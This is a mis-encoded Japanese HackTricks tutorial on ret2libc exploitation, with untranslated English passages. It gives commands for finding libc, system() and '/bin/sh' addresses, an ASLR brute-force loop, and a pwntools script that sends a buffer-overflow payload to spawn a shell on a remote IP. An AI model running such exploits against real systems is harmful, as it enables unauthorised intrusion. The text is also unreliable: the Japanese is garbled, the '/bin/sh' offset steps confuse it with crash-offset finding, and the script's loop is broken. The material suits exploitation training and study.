<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>


**è„†å¼±ãªãƒã‚¤ãƒŠãƒªã‚’è¦‹ã¤ã‘ã€Ret2Libã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒã§ãã‚‹ã¨æ€ã£ãŸå ´åˆã€ä»¥ä¸‹ã¯åŸºæœ¬çš„ãªæ‰‹é †ã§ã™ã€‚**

# **ãƒ›ã‚¹ãƒˆå†…éƒ¨**ã«ã„ã‚‹å ´åˆ

## **libcã®ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
ASLRãŒlibcã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¤‰æ›´ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ãŸã„å ´åˆã¯ã€æ¬¡ã®æ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹

To get the offset of the system function, we can use the `nm` command to list the symbols in a binary file. The system function is usually located in the libc library, so we need to find the address of the system function in libc.

ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€`nm`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«å†…ã®ã‚·ãƒ³ãƒœãƒ«ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã¯é€šå¸¸ã€libcãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«å­˜åœ¨ã™ã‚‹ãŸã‚ã€libcå†…ã®ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

First, we need to identify the libc library used by the target binary. We can do this by running the `ldd` command followed by the path to the binary. Look for the libc library in the output.

ã¾ãšã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚¤ãƒŠãƒªãŒä½¿ç”¨ã—ã¦ã„ã‚‹libcãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€`ldd`ã‚³ãƒãƒ³ãƒ‰ã‚’ãƒã‚¤ãƒŠãƒªã®ãƒ‘ã‚¹ã«ç¶šã‘ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚å‡ºåŠ›ã‹ã‚‰libcãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ¢ã—ã¦ãã ã•ã„ã€‚

Once we have identified the libc library, we can use the `nm` command to list the symbols in the library. Pipe the output of `nm` to `grep` and search for the system function. The output will include the address of the system function.

libcãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç‰¹å®šã—ãŸã‚‰ã€`nm`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã®ã‚·ãƒ³ãƒœãƒ«ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚`nm`ã®å‡ºåŠ›ã‚’`grep`ã«ãƒ‘ã‚¤ãƒ—ã—ã€ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã‚’æ¤œç´¢ã—ã¾ã™ã€‚å‡ºåŠ›ã«ã¯ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå«ã¾ã‚Œã¾ã™ã€‚

The offset of the system function can be calculated by subtracting the base address of the libc library from the address of the system function.

ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã¯ã€libcãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã‚·ã‚¹ãƒ†ãƒ é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¼•ãã“ã¨ã§è¨ˆç®—ã§ãã¾ã™ã€‚
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## "/bin/sh"ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹

To get the offset of "/bin/sh" in the binary, we can use the following steps:

1. Create a pattern of characters using a pattern generation tool like `pattern_create.rb` or `msf-pattern_create`.
2. Inject the pattern into the vulnerable program, causing it to crash.
3. Identify the offset value by analyzing the crash. This can be done by using a pattern matching tool like `pattern_offset.rb` or `msf-pattern_offset`.
4. Use the obtained offset value to calculate the address of "/bin/sh" in memory.

By following these steps, we can determine the offset of "/bin/sh" and use it in our exploit.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

ãƒ—ãƒ­ã‚»ã‚¹ãŒæ¯å›ï¼ˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒãƒ¼ã®å ´åˆï¼‰è©±ã™ãŸã³ã«**å­ãƒ—ãƒ­ã‚»ã‚¹**ã‚’ä½œæˆã—ã¦ã„ã‚‹å ´åˆã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**èª­ã¿å–ã‚‹**ã“ã¨ã‚’è©¦ã—ã¦ãã ã•ã„ï¼ˆãŠãã‚‰ãrootæ¨©é™ãŒå¿…è¦ã§ã™ï¼‰ã€‚

ã“ã“ã§ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹å†…ã®**libcãŒæ­£ç¢ºã«ã©ã“ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ã‹**ã¨ã€ãƒ—ãƒ­ã‚»ã‚¹ã®ã™ã¹ã¦ã®å­ãƒ—ãƒ­ã‚»ã‚¹ã«**ã©ã“ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã‹**ãŒã‚ã‹ã‚Šã¾ã™ã€‚

![](<../../.gitbook/assets/image (95).png>)

ã“ã®å ´åˆã€**0xb75dc000**ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã¾ã™ï¼ˆã“ã‚ŒãŒlibcã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ãªã‚Šã¾ã™ï¼‰

## gdb-pedaã‚’ä½¿ç”¨ã™ã‚‹

gdb-pedaã‚’ä½¿ç”¨ã—ã¦ã€**system**é–¢æ•°ã€**exit**é–¢æ•°ã€ãŠã‚ˆã³æ–‡å­—åˆ—**"/bin/sh"**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã—ã¾ã™ã€‚
```
p system
p exit
find "/bin/sh"
```
# ASLRã®ãƒã‚¤ãƒ‘ã‚¹

libcã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã§è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# ã‚³ãƒ¼ãƒ‰
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
